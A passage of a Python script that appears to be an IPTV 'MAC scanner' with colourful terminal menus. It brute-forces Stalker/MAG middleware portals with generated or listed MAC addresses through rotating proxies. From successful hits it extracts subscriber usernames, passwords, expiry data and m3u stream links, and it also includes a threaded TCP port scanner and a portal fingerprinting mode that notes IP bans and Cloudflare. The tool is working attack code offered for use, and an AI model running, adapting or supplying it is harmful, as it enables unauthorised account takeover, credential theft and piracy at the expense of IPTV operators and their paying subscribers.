			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			except:pass
		if trh=="":
			if uzmanm=="stalker_portal/server/load.php":
				trh=expire_billing_date
		veri=""
		cid="1842"
		url=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"
		bad=0
		while True:
			try:
				res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
				veri=str(res.text)
				if 'total' in veri:
					cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				if uzmanm=="stalker_portal/server/load.php":
				     cid=(str(res.text).split('id":"')[5].split('"')[0])
				break
			except:pass
		user=""
		pas=""
		link=""
		
		real=panel
		if not expires=="":
			veri=""
			cmd=""
			url=http+"://"+panel+"/"+uzmanm+"?action=get_ordered_list&type=vod&p=1&JsHttpRequest=1-xml"
			while True:
				try:
					res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
					veri=str(res.text)
					break
				except:pass
			if not 'cmd' in veri:
				continue
			cmd=duzel2(veri,'cmd')
			
			veri=""
			url=http+"://"+panel+"/"+uzmanm+"?type=vod&action=create_link&cmd="+str(cmd)+"&series=&forced_storage=&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
			while True:
				try:
					res=ses.get(url,headers=hea2(mac,token),proxies=proxygetir(),timeout=(3))
					veri=str(res.text)
					break
				except:pass
			if 'cmd":"' in veri:
				link=veri.split('cmd":"')[1].split('"')[0].replace('\/','/')
				user=str(link.replace('movie/','').split('/')[3])
				real=http+"://"+link.split('://')[1].split('/')[0]+'/c/'
				pas=str(link.replace('movie/','').split('/')[4])
				cid=duzel2(veri,'id')
				m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
				
		hitecho(mac,trh)
		hit=hit+1
		hitr="\33[1;96m"
		veri=""
		if user=="":
			while True:
				try:
					res = ses.get(url7(cid), headers=hea2(mac,token), proxies=proxygetir(),timeout=(3), verify=False)
					veri=str(res.text)
					if 'ffmpeg ' in veri:
					     link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
					else:
					     if 'cmd":"' in veri:
					     	link=veri.split('cmd":"')[1].split('"')[0].replace('\/','/')
					     	user=login
					     	pas=password
					     	real='http://'+link.split('://')[1].split('/')[0]+'/c/'
					if 'ffmpeg ' in veri:
					     user=str(link.replace('live/','').split('/')[3])
					     pas=str(link.replace('live/','').split('/')[4])
					     if real==panel:
					     	real='http://'+link.split('://')[1].split('/')[0]+'/c/'
					m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
				
					break
				except:pass
		durum=""
		if not link=="":
			try:
				durum=goruntu(link,cid)
			except:pass
		if not m3ulink=="":
			playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			plink=real.replace('http://','').replace('/c/','')
			playerapi=m3uapi(playerlink,mac,token)
			m3uimage=m3ugoruntu(cid,user,pas,plink)
			if playerapi=="":
			    playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			    plink=panel.replace('http://','').replace('/c/','')
			    playerapi=m3uapi(playerlink,mac,token)
			    m3uimage=m3ugoruntu(cid,user,pas,plink)
		if m3uimage=="𝗢𝗡𝗟𝗜𝗡𝗘 ✅":
			m3uvpn=m3uvpn+1
		else:
			m3uon=m3uon+1
		if durum=="𝗨𝗦𝗘 𝗩𝗣𝗡 ⛔ " or durum=="Invalid Opps":
			macvpn=macvpn+1
		else:
			macon=macon+1
		vpn=""
		if not ip =="":
			vpn=vpnip(ip)
		else:
			vpn="No Client IP Address"

		url5="https://ipapi.co/"+ip+"/json/" 
		while True:
    		 try:
        		 res = ses.get(url5, timeout=15, verify=False)
        		 break
    		 except:
        		 bag1=bag1+1
        		 time.sleep(bekleme)
        		 if bag1==4:
            		  break
		            	
		try:
		       bag1=0
		       veri=str(res.text)
		       scountry="Unavailable "
		       country_name ="Unavailable"
		       scountry=veri.split('country_code": "')[1]
		       scountry.split('"')[0]
		       if scountry =="":
		        scountry="Unavailable "
		       country_name=veri.split('country_name": "')[1]
		       country_name=country_name.split('"')[0]
		except:pass

		livelist=""
		vodlist=""
		serieslist=""
		liveurl=http+"://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"
		if not expires=="":
			liveurl=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_genres&JsHttpRequest=1-xml" 
		if uzmanm=="stalker_portal/server/load.php":
			liveurl=http+"://"+panel+"/"+uzmanm+"?type=itv&action=get_genres&JsHttpRequest=1-xml"
		vodurl=http+"://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"
		seriesurl=http+"://"+panel+"/"+uzmanm+"?action=get_categories&type=series&JsHttpRequest=1-xml"
		if kanalkata=="1" or kanalkata=="2":
			listlink=liveurl
			livel=' ⚜️'
			livelist=list(listlink,mac,token,livel)
		if kanalkata=="2":
			listlink=vodurl
			livel='⚡'
			vodlist=list(listlink,mac,token,livel)
			listlink=seriesurl
			livel='🔱'
			serieslist=list(listlink,mac,token,livel)
		
		hityaz(mac,trh,real,m3ulink,m3uimage,durum,vpn,livelist,vodlist,serieslist,playerapi,fname,tariff_plan,ls,login,password,tariff_plan_id,bill,expire_billing_date,max_online,parent_password,stb_type,comment,country,settings_password,adult,scountry,country_name)

	
	
def vpnip(ip):
	url9="https://freeipapi.com/api/json/"+ip
	vpnip=""
	vpn="𝙽𝙾𝚃 𝙸𝙽𝚅𝙰𝙻𝙸𝙳"
	veri=""
	try:
		res = ses.get(url9,  timeout=7, verify=False)
		veri=str(res.text)
	except:
		vpn="𝙽𝙾𝚃 𝙸𝙽𝚅𝙰𝙻𝙸𝙳"
	if not '404 page' in veri:
		if 'countryName' in veri:
			vpnc=veri.split('cityName":"')[1]
			vpnc=vpnc.split('"')[0]
			vpnips=veri.split('countryName":"')[1]
			vpnips=vpnips.split('"')[0]
			vpn= vpnips +'/' +vpnc 
		else:
			vpn="𝙽𝙾𝚃 𝙸𝙽𝚅𝙰𝙻𝙸𝙳"
	return vpn
import socket
import requests
from termcolor import colored
os.system('clear')
print (Novel)
Pro = input(f'''\n\033[38;5;003m               𝗖𝗛𝗢𝗢𝗦𝗘 𝗦𝗖𝗔𝗡𝗡𝗘𝗥   \n\33[0m
     |\033[38;5;002m1\033[38;5;255m| YES \033[38;5;039m\33[0m
     |\033[38;5;002m2\033[38;5;255m| NO \033[38;5;039m   
\n\n                 \033[38;5;039m𝗦𝗘𝗟𝗘𝗖𝗧 𝗡𝗨𝗠𝗕𝗘𝗥    \n		
\n\033[38;5;039m            ➣ \33[0m''')
if not Pro == "1":
    Pro = "2"
    proxix = ""

# Faz você escolher qual tipo de versão de proxy vai ser usado
if Pro == "1":
    os.system('clear')
    print (Novel)
    proxix = input(f"""\n\033[38;5;003m              𝗖𝗛𝗢𝗢𝗦𝗘 𝗦𝗖𝗔𝗡   \n\33[0m
     |\033[38;5;002m1\033[38;5;255m| 𝙲𝙷𝙴??𝙺𝙴𝚁   \33[0m
     |\033[38;5;002m2\033[38;5;255m| 𝚂𝙲𝙰𝙽𝙽𝙴𝚁 
     \n\n                 \033[38;5;039m𝗦𝗘𝗟𝗘𝗖𝗧 𝗡𝗨𝗠𝗕𝗘𝗥    \n		
\n\033[38;5;039m            ➣ \33[0m""")
    if not proxix == "2":
        proxix = "1"
from queue import Queue
from datetime import datetime
if Pro == "1" and proxix == "1":
    os.system('clear')
    print (Novel)
    host = socket.gethostbyname(input("\n\033[38;5;003m          𝗘𝗡𝗧𝗘𝗥 𝗣𝗔𝗡𝗘𝗟 𝗣𝗢𝗥𝗧 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞   \n                \033[38;5;039mGreekiptv\033[38;5;255m.\033[38;5;039mcom\n\n\033[38;5;039m            ➣ \33[0m"))
    normalPortStart = 1
    normalPortEnd = 1024
    allPort = 1
    allPortEnd = 65535
    customPortStart = 0
    customPortEnd = 0
    now = datetime.now()
    start_time = now.strftime("%H:%M")
    current_time = now.strftime("%H:%M")
    os.system('clear')
    print (Novel)
    print("\n\033[38;5;003m               𝗘𝗡𝗧𝗘𝗥 𝗣𝗔𝗡𝗘𝗟 𝗣𝗢𝗥𝗧 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞    \n\33[0m")
    print("     |\033[38;5;040m1\033[38;5;255m| \033[38;5;039m1\033[38;5;255m 𝚝𝚘 \033[38;5;039m1024\033[38;5;255m 𝙿𝚘𝚛𝚝 𝚜𝚌𝚊𝚗")
    print("     |\033[38;5;040m1\033[38;5;255m| \033[38;5;039m1\033[38;5;255m 𝚝𝚘 \033[38;5;039m65535\033[38;5;255m 𝙿𝚘𝚛𝚝 𝚜𝚌𝚊𝚗")
    print("     |\033[38;5;040m3\033[38;5;255m| 𝙲𝚞𝚜𝚝𝚘𝚖 𝙿𝚘𝚛𝚝 𝚂𝚌𝚊𝚗")
    print("     |\033[38;5;040m4\033[38;5;255m|\033[38;5;196m 𝙴𝚇𝙸𝚃 \n")

    mode = int(input("\x1b[0m\n\n\033[38;5;039m           ➣ \033[38;5;231m" )) 
    os.system('clear')
    print(Novel)
    if mode == 3:
        customPortStart = int(input("\n              \033[38;5;003m𝙴𝚗𝚝𝚎𝚛 𝚂𝚝𝚊𝚛𝚝 𝙿𝚘𝚛𝚝 𝙽𝚞𝚖𝚋𝚎𝚛 \n\n           \033[38;5;039m➣ \33[0m"))
        customPortEnd = int(input("\n              \033[38;5;003m𝙴𝚗𝚝𝚎𝚛 𝙴𝚗𝚍 𝙿𝚘𝚛𝚝 𝙽𝚞𝚖𝚋𝚎𝚛 \n\n           \033[38;5;039m➣ \33[0m"))

    print("-"*43)
    print(f"                 \033[38;5;196m𝚃𝚊𝚛𝚐𝚎𝚝 𝙸𝙿\n              \033[38;5;255m{host} \n")
    print(f"                 \033[38;5;003m𝚂𝚌𝚊𝚗 𝚂𝚝𝚊𝚛𝚝\n                   \033[38;5;255m{start_time} ")	
    print("-"*43)
    def scan(port):
        s = socket.socket()
        s.settimeout(5)
        result = s.connect_ex((host, port))
        if result == 0:
              print("               \033[38;5;003m𝙾𝚙𝚎𝚗 𝙿𝚘𝚛𝚝 \033[38;5;039m➣ \033[38;5;002m", port)
        time.sleep(0.5)
        s.close()

    queue = Queue()
    def get_ports(mode):
        if mode == 1:
                print("\n")
                for port in range(normalPortStart, normalPortEnd+1):
                        queue.put(port)
        elif mode == 2:
                print("\n")
                for port in range(allPort, allPortEnd+1):
                        queue.put(port)
        elif mode == 3:
                print("\n")
                for port in range(customPortStart, customPortEnd+1):
                        queue.put(port)
        elif mode == 4:
                exit

    open_ports = [] 
    def worker():
        while not queue.empty():
                port = queue.get()
                if scan(port):
                        print("               \033[38;5;003m𝙾𝚙𝚎𝚗 𝙿𝚘𝚛𝚝 \033[38;5;039m➣ \033[38;5;002m {} ".format(port))
                        open_ports.append(port)

    def run_scanner(threads, mode):

        get_ports(mode)

        thread_list = []

        for t in range(threads):
                thread = threading.Thread(target=worker)
                thread_list.append(thread)

        for thread in thread_list:
                thread.start()

        for thread in thread_list:
                thread.join()

    run_scanner(1021, mode)
    print(f"\n                 \033[38;5;196m𝗦𝗖𝗔𝗡 𝗙𝗜𝗡𝗜𝗦𝗛𝗘𝗗 \n\033[38;5;255m                       {current_time} ") 
if Pro == "1" and proxix == "2": 
    vrdata = ""
    clfe = ""
    clfc = ""
    vrdX = ""
    phpX = ""
    PHPa = ""
    PHPv = ""
    os.system('clear')
    print(Novel)
    print("\n\033[38;5;003m          𝗘𝗡𝗧𝗘𝗥 𝗣𝗔𝗡𝗘𝗟 𝗣𝗢𝗥𝗧 𝗧𝗢 𝗦𝗖𝗔𝗡   \n                \033[38;5;039mGreekiptv\033[38;5;255m.\033[38;5;039mcom\x1b[0m\n")
    panel = input("\033[38;5;039m          ➣ \033[38;5;231m")
    print("\n\n\033[38;5;046m                  ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ♻")
    print("\x1b[0m")
    if panel == "0":
        time.sleep(0.1)
    if "http://" in panel or "https://" in panel:
        panel = panel.split("://")[1]
    panel = panel.replace("/c/", "")
    panel = panel.replace("/c", "")
    panels = str(panel)
    if "/stalker_portal" in panel:
        panels = panels.replace("/stalker_portal", "")
        panel = panel.replace("/stalker_portal/", "/stalker_portal")
    if "/rmxportal" in panel:
        panels = panels.replace("/rmxportal", "")
        panel = panel.replace("/rmxportal/", "/rmxportal")
    if "/cmdforex" in panel:
        panels = panels.replace("/cmdforex", "")
        panel = panel.replace("/cmdforex/", "/cmdforex")
    if "/portalstb" in panel:
        panels = panels.replace("/portalstb", "")
        panel = panel.replace("/portalstb/", "/portalstb")
    if "/powerfull" in panel:
        panels = panels.replace("/powerfull", "")
        panel = panel.replace("/powerfull/", "/powerfull")
    if "/magaccess" in panel:
        panels = panels.replace("/magaccess", "")
        panel = panel.replace("/magaccess/", "/magaccess")
    if "/maglove" in panel:
        panels = panels.replace("/maglove", "")
        panel = panel.replace("/maglove/", "/maglove")
    panels = panels.replace(" ", "")
    panel = panel.replace(" ", "")
    datc = ""
    reset = 0

    try:
        res = ""
        spanl = str(panel)
        if ":" in spanl:
            spanl = spanl.split(":")[0]
        if "/" in spanl:
            spanl = spanl.split("/")[0]
            spanl = spanl.replace("/", "")
        urlu = "https://iplist.cc/api/" + str(spanl)
        res = ses.get(urlu, timeout=5, verify=None)
        datc = str(res.text)
    except Exception:
        reset = reset + 1
        time.sleep(1)
        if reset == 3:
            res = ""
            datc = ""

    if 'ip": "' in datc:
        servip = ""
        con = ""
        ip = ""

        try:
            ip = datc.split('ip": "')[1].split('"')[0]
            con = datc.split('countryname": "')[1].split('"')[0]
            con = con.replace("United States of America", "United States").replace(
                "United Kingdom of Great Britain and Northern Ireland", "United Kingdom"
            )
        except Exception:        
            pass

        servip = f"""\n\x1b[96m    ● ServIP\x1b[0m ➺  \x1b[93m{ip}\x1b[0m ✔️\n\x1b[96m    ● Country\x1b[0m ➺  \x1b[93m{con}\x1b[0m ✔️"""
    else:
        servip = ""
        res = ""
    HEADERA = {
        "User-Agent": useragent,
        "Referer": "http://" + panel + "/c/",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Host": panels,
        "Cookie": "mac=00%3A1A%3A79%3A01%3ACA%3A35; stb_lang=en; timezone=Europe%2FParis;",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "Keep-Alive",
        "X-User-Agent": "Model: MAG250; Link: Ethernet,WiFi",
    }
    phptitle = ""

    try:
        phptitle = str(
            ses.get("http://" + panel + "/c/", headers=HEADERA, timeout=2, verify=None)
            .text.split("<title>")[1]
            .split("<")[0]
            + "\n"
        )
    except Exception:
        pass

    down = ""
    csp = ""
    cse = ""
    ccf = ""
    cpp = ""
    VPN = ""
    cc = ""
    if "NXT" in phptitle or "c/" in phptitle:
        cc = "NXT c/"
    elif "stalker_portal" in phptitle:
        if "stalker_portal/" in phptitle:
            csp = "stalker_portal/"
        cpp = "server/load.php"
        cse = "\n                \033[38;5;002m(ꜱᴛᴀʟᴋᴇʀ_ᴘᴏʀᴛᴀʟ) \x1b[0m"
    elif "portal" in phptitle or "Portal" in phptitle:
        cpp = "portal.php"
        cse = "\n                   \x1b[90m[Portal] \x1b[0m"
    elif "Access denied" in phptitle:
        csp = "❌"
        if "cloudflare" in phptitle:
            ccf = "❌"
        elif "server is down" in phptitle:
            down = "down"
        else:
            cse = phptitle.replace("\n", "")
            cse = "\n         \x1b[90m[" + str(cse) + "] \x1b[0m"
    phpdata = ""

    try:
        phpdata = str(
            ses.get(
                "http://" + panel + "/c/xpcom.common.js",
                headers=HEADERA,
                timeout=2,
                verify=None,
            ).text.replace(" ", "")
        )
        phpd = phpdata
        if "+this.portal_ip+'/" in phpdata:
            phpdata = phpdata.split("portal_ip+'/")[1].split("';")[0]
            if "+this.portal_path+'" in phpdata:
                phpdata = phpdata.split("+'/")[1].split("';")[0]
            phpX = "✔️"
        elif "+this.portal_path+'" in phpd:
            phpdata = phpdata.split("+'/")[1].split("';")[0]
            phpX = "✔️"
        elif "c/portal.php" in phpd:
            phpdata = "c/portal.php"
            phpX = "✔️"
        elif "stalker_portal" in phpd:
            phpdata = csp + "server/load.php"
            phpX = "✔️"
        elif "c/server/load.php" in phpd:
            phpdata = "c/server/load.php"
            phpX = "✔️"
        else:
            phpX = "None"
            if phpd == "":
                phpX = "NoX"
            if "CommonXPCOMSTBconstructor" in phpd:
                phpX = "NoM"
            if "403Forbidden" in phpd:
                phpX = "❌"
            if "404 Not Found" in phpd:
                phpX = "❌"
            if "!DOCTYPE" in phpd:
                VPN = "VPN"
        if "cloudflare" in phpd or ccf == "❌":
            clfe = "\x1b[91m[CloudFlare] \x1b[0m"
        phpdata = phpdata.replace("\n", "")
    except Exception:
        pass

    try:
        vrdata = str(
            ses.get(
                "http://" + panel + "/c/version.js",
                headers=HEADERA,
                timeout=2,
                verify=None,
            ).text.replace(" ", "")
        )
        vrd2 = vrdata
        if "ver='" in vrdata:
            vrdata = vrdata.split("ver='")[1].split("';")[0]
            vrdX = "✔️"
        elif "cloudflare" in vrd2 or not (clfe == ""):
            clfc = " \x1b[91m[CloudFlare] \x1b[0m"
            vrdata = "None"
            vrdX = "❌"
        elif "<!DOCTYPE" in vrd2:
            vrdata = "Down⁉"
            vrdX = "❌"
        else:
            vrdX = "❌"
        if vrdata == "":
            vrdX = "❌"
        vrdata = vrdata.replace("\n", "")
        if vrd2 == "":
            vrdX = "❌"
    except Exception:
        pass

    if "XUI" in vrdata and cpp == "portal.php":
        vrdX = "✔️"
        cc = ""
        if not (phpdata == "") or not (phpdata == " "):
            phpdata = f"""c/{phpdata}"""
        else:
            phpdata = "c/portal.php"
    if "stalker_portal" in phptitle and phpdata == "portal.php":
        vrdX = "✔️"
        cc = ""
        phpdata = "server/load.php"
        cpp = "server/load.php"
    if VPN == "VPN":
        VPN = "\n    ❌ \x1b[31mᴍᴀʏʙᴇ ʏᴏᴜʀ ɪᴘ ɪꜱ ʙᴀɴɴᴇᴅ!❌ \n   - ᴛɪᴘ = ᴜꜱᴇ ᴠᴘɴ ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ.\x1b[0m "
    if phpX == "✔️":
        if "portal.php" in phpdata or "load.php" in phpdata:
            PHPa = f"""\033[38;5;039m            ᴘʜᴘ\033[38;5;039m  ➣ \033[38;5;255m {cc + phpdata} \x1b[0m  {cse}{clfe}"""
            if "portal.php" not in PHPa and cpp == "portal.php":
                PHPa = f"""\033[38;5;039m            ᴘʜᴘ\033[38;5;039m  ➣ \033[38;5;255m {cc + cpp} \x1b[0m {cse}{clfe}"""
            else:
                PHPa = f"""\033[38;5;039m            ᴘʜᴘ\033[38;5;039m  ➣ \033[38;5;255m {csp + phpdata} \x1b[0m {cse}{clfe}"""
        elif phpX == "None":
            PHPa = f"""\033[38;5;039m            ᴘʜᴘ\033[38;5;039m  ➣ \033[38;5;255m {csp + cc}server/load.php❗ \x1b[0m{clfe}{VPN}"""
            phpX = "✔️"
        elif phpX == "NoX":
            PHPa = f"""\033[38;5;039m            ᴘʜᴘ\033[38;5;039m  ➣ \033[38;5;255m portal.php or c/portal.php \x1b[0m❗ {clfe}{VPN}"""
            phpX = "✔️"
        elif phpX == "NoM":
            PHPa = f"""\033[38;5;039m            ᴘʜᴘ\033[38;5;039m  ➣ \033[38;5;255m {cc}portal.php \x1b[0m❗ {clfe}{VPN}"""
            phpX = "✔️"
        else:
            PHPa = "    ❌ \x1b[31m ᴇʀʀᴏʀ! ꜱᴇʀᴠᴇʀ ᴍᴀʏ ʙᴇ ᴅᴏᴡɴ⁉ \n     Tip = Use VPN and try again. \x1b[0m"
    if vrdX == "✔️":
        PHPv = f"""\033[38;5;039m            ᴠᴇʀ\033[38;5;039m  ➣ \033[38;5;255m {vrdata} \x1b[0m{clfc}"""
    else:
        PHPv = f"""\033[38;5;039m            ᴠᴇʀ\033[38;5;039m  ➣ \033[38;5;255m ɴᴏᴛ ꜰᴏᴜɴᴅ \x1b[0m{clfc}"""
    os.system('clear')
    print(Novel)
    if down == "down":
        down = "\n        ❌  \x1b[31mꜱᴇʀᴠᴇʀ ᴍᴀʏ ʙᴇ ᴅᴏᴡɴ⁉\x1b[0m ❌ "
    if phpX == "❌":
        print(
            f"""\033[38;5;039m           ʜᴏꜱᴛ\033[38;5;039m ➣ \033[38;5;255m {panels} \x1b[0m❌ {down}{VPN}{servip}\n"""
        )
        print(PHPa)
    else:
        print("\n\033[38;5;003m               𝗣𝗢𝗥𝗧𝗔𝗟 𝗗𝗔𝗧𝗔 𝗥𝗘𝗦𝗨𝗟𝗧    \x1b[0m\n\n")
        print(
            f"""\033[38;5;039m            ʜᴏꜱᴛ\033[38;5;039m ➣ \033[38;5;256m {panels} \x1b[0m {down}{servip}"""
        )
        print(PHPv)
        print(PHPa)
    panel2 = input(
        "\n\n"
        + "\033[38;5;255m                   𝗣𝗥𝗘𝗦𝗦 \033[38;5;196m 𝗘𝗡𝗧𝗘𝗥  \33[0m\n          \033[38;5;039m➣ \33[0m"
    )
    print("\x1b[90m")
    if panel2 == "0":
        time.sleep(0.1)
     
os.system('clear')
print (Novel)
panel=input("\n\033[38;5;003m               𝗘𝗡𝗧𝗘𝗥 𝗣𝗔𝗡𝗘𝗟 𝗣𝗢𝗥𝗧  \n                \033[38;5;039mGreekiptv\033[38;5;255m.\033[38;5;039mcom\033[38;5;255m:\033[38;5;002m80\n\n\033[38;5;039m            ➣ \33[0m")
ban=""
uzmanm="portal.php" 
realblue=""
sek=("""\n\033[38;5;003m                 𝗖𝗛𝗢𝗢𝗦𝗘 𝗣𝗢𝗥𝗧𝗔𝗟   \n\33[36m""")
os.system('clear')
print(Novel)
print (sek)
reqs=(
"portal.php",
"server/load.php",
"c/portal.php",
"stalker_portal/server/load.php",
"stalker_portal/server/load.php 2",
"stalker_portal/server/load.php ▣",
"portal.php Real Blue",
"portal.php HTTPS",
"stalker_portal/server/load.php S",
)
say=0
for i in reqs:
	say=say+1
	print(" \033[38;5;255m    |\033[38;5;002m"+str(say)+"\033[38;5;255m|"+"\033[38;5;039m ➣  \033[38;5;231m"+str(i)+" ")
say=0
uzmanm=input('\n                 \033[38;5;039m𝗦𝗘𝗟𝗘𝗖𝗧 𝗡𝗨𝗠𝗕𝗘𝗥    \n\n \033[38;5;039m            ➣ \33[0m')
if uzmanm=="0":
	uzmanm=input("Write Request:")
if uzmanm=="":
	uzmanm="portal.php"
uzmanm=reqs[int(uzmanm)-1]
if uzmanm=="stalker_portal/server/load.php 2":
	stalker_portal="2"
	uzmanm="stalker_portal/server/load.php"
if uzmanm=="stalker_portal/server/load.php ▣":
	stalker_portal="1"
	uzmanm="stalker_portal/server/load.php"	
if uzmanm=="portal.php - No Ban":
	ban="ban"
	uzmanm="portal.php"
http="http"
if uzmanm=="portal.php Real Blue":
	realblue="real"
	uzmanm="portal.php"
if uzmanm=="portal.php HTTPS":
	uzmanm="portal.php"
	http="https"
if uzmanm=="stalker_portal/server/load.php S":
	uzmanm="stalker_portal/server/load.php"
	http="https"
print(uzmanm)
#uzmanm="magLoad.php"
panel=panel.replace('stalker_portal','')
panel=panel.replace('http://','')
panel=panel.replace('/c/','')
panel=panel.replace('/c','')
panel=panel.replace('/','')
panel=panel.replace(' ','')

dosyaadi=panel.replace(":","_")
#http://gotv.one/stalker_portal/c/
os.system('clear')
print(Novel)
import urllib3
import os
def temizle():
    print("\n\033[38;5;003m                𝗖𝗛𝗢𝗢𝗦𝗘 𝗠𝗔𝗖 𝗧𝗬𝗣𝗘          \33[0m\n")
yeninesil=(
'00:1A:79:',
'D4:CF:F9:',
'33:44:CF:',
'10:27:BE:',
'A0:BB:3E:',
'55:93:EA:',  
'04:D6:AA:',
'11:33:01:',
'00:1C:19:',
'1A:00:6A:',
'1A:00:FB:',
'00:A1:79:',
'00:1B:79:',
'00:2A:79:',
)
comboc=""
combototLen=""
combouz=0
combodosya=""
proxyc=""
proxytotLen=""
proxydosya=""
proxyuz=0

def dosyasec():
	global comboc,combototLen,proxyuz,proxydosya,combodosya,proxyc,proxytotLen,proxyuz,combouz,randomturu,serim,seri,mactur,randommu
	say=0
	dsy=""
	
	if comboc=="":
		mesaj="\n\n                 \033[38;5;039m𝗦𝗘𝗟𝗘𝗖𝗧 𝗡𝗨𝗠𝗕𝗘𝗥    \n"
		dir=rootDir+'combo/'
		dsy="\n     |\033[38;5;002m0\033[38;5;255m|\033[38;5;039m ➣ \033[38;5;002m 𝚁𝚊𝚗𝚍𝚘𝚖\33[38;5;039mᵃᵘᵗᵒ     \33[0m\n"
	else:
		mesaj="          \nꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴄᴏᴍʙᴏ ᴡʜᴇʀᴇ ɪᴛ ɪꜱ ᴛʜᴇ ᴘʀᴏxʏ"
		dir=rootDir+'proxy/'
	if not os.path.exists(dir):
	    os.mkdir(dir)
	for files in os.listdir (dir):
	 	say=say+1
	 	dsy=dsy+"     \033[38;5;255m|\033[38;5;002m"+str(say)+"\033[38;5;255m|\033[38;5;039m ➣  \33[0m"+files+'\n'
	print ("""\n\033[38;5;003m               𝗖𝗛𝗢𝗢𝗦𝗘 𝗠𝗔𝗖 𝗖𝗢𝗠𝗕𝗢           \33[0m	
"""+dsy+"""
\033[38;5;255m               𝙵𝙾𝚄𝙽𝙳 \033[38;5;002m""" +str(say)+"""\033[38;5;255m 𝙼𝙰𝙲 𝙲𝙾𝙼𝙱𝙾𝚂    """)
	dsyno=str(input("\33[31m"+mesaj+"\n\033[38;5;039m            ➣ \33[0m"))
	say=0
	for files in os.listdir (dir):
		 say=say+1
		 if dsyno==str(say):
		 	dosya=(dir+files)
		 	break
	say=0
	try:
		 if not dosya=="":
		 	print(dosya)
		 else:
		 		temizle()
		 		print("\033[38;5;196m               ɪɴᴄᴏʀʀᴇᴄᴛ ᴄᴏᴍʙᴏ ꜰɪʟᴇ ꜱᴇʟᴇᴄᴛɪᴏɴ          \33[0m!")
		 		quit()
	except:
		if comboc=="":
			if dsyno=="0" or dsyno=="":
				os.system('clear')
				print(Novel)
				temizle()
				nnesil=str(yeninesil)
				nnesil=(nnesil.count(',')+1)
				for xd in range(0,(nnesil)):
		 			tire='\033[38;5;039m ➣  \33[0m'
		 			if int(xd) <9:
		 				tire='  \033[38;5;039m➣  \33[0m'
		 			print(" \033[38;5;255m    |\033[38;5;002m"+str(xd+1)+"\033[38;5;255m|"+tire+yeninesil[xd])
				mactur=input("\n                 \033[38;5;039m𝗦𝗘𝗟𝗘𝗖𝗧 𝗡𝗨𝗠𝗕𝗘𝗥       \n\n\33[36m\033[38;5;039m            ➣ \33[0m")
				os.system('clear')
				print(Novel)
				if mactur=="":
		 			mactur=1
				randomturu=input("""
\033[38;5;003m               𝗖𝗛𝗢𝗢𝗦𝗘 𝗠𝗔𝗖 𝗦𝗘𝗧          \33[0m
	
     |\033[38;5;002m1\033[38;5;255m| Cascading \033[38;5;039mᵐᵃᶜ\33[0m
     |\033[38;5;002m2\033[38;5;255m| Random \033[38;5;039m   ᵐᵃᶜ
\n\n                 \033[38;5;039m𝗦𝗘𝗟𝗘𝗖𝗧 𝗡𝗨𝗠𝗕𝗘𝗥    \n		
\n\033[38;5;039m            ➣ \33[0m""")
				os.system('clear')
				print(Novel)
				if randomturu=="":
		 			randomturu="2"
				serim=""
				os.system('clear')
				print(Novel)
				serim=input("""
\033[38;5;003m               𝗖𝗛𝗢𝗢𝗦𝗘 𝗠𝗔𝗖 𝗦𝗘𝗥𝗜𝗔𝗟         \33[0m	
     
     |\033[38;5;002m1\033[38;5;255m| YES\33[0m
     |\033[38;5;002m2\033[38;5;255m| NO
\n\n                 \033[38;5;039m𝗦𝗘𝗟𝗘𝗖𝗧 𝗡𝗨𝗠𝗕𝗘𝗥    \n		
\n\033[38;5;039m            ➣ \33[0m""")
				mactur=yeninesil[int(mactur)-1]
				os.system('clear')
				print(Novel)
				if serim =="1":
		 			seri=input("       \n\n\033[38;5;003m            𝗖𝗛𝗢𝗢𝗦𝗘 𝗢𝗡𝗘 𝗢𝗙 𝗧𝗛𝗘 𝗧𝗪𝗢    \33[0m\n\n     |\033[38;5;003m1\033[38;5;255m| "+mactur+"\033[38;5;039m5\33[0m\n     |\033[38;5;003m2\033[38;5;255m| "+mactur+"\033[38;5;039mFA\33[0m\n\n         \33[1m"+mactur+"\033[38;5;039m")
				combouz=input("""\n\033[38;5;003m          𝗡𝗨𝗠𝗕𝗘𝗥 𝗢𝗙 𝗠𝗔𝗖𝗦 𝗧𝗢 𝗦𝗖𝗔𝗡    			
\n\033[38;5;039m            ➣ \33[0m""")
				if combouz=="":
		 			combouz=3000
				combouz=int(combouz)
				randommu="Novel"
		else:
			temizle()
			print("\033[38;5;196m               ɪɴᴄᴏʀʀᴇᴄᴛ ᴄᴏᴍʙᴏ ꜰɪʟᴇ ꜱᴇʟᴇᴄᴛɪᴏɴ          \33[0m!")
			quit()
	if comboc=="":
		if randommu=="":
			combodosya=dosya
			comboc=open(dosya, 'r')
			combototLen=comboc.readlines()
			combouz=(len(combototLen))
		else:
			comboc='Novel'
	else:
		#if not comboc=='Novel':
			proxydosya=dosya
			proxyc=open(dosya, 'r')
			proxytotLen=proxyc.readlines()
			proxyuz=(len(proxytotLen))
			
randommu=""
dosyasec()
os.system('clear')
print(Novel)
c = ""
d = -1
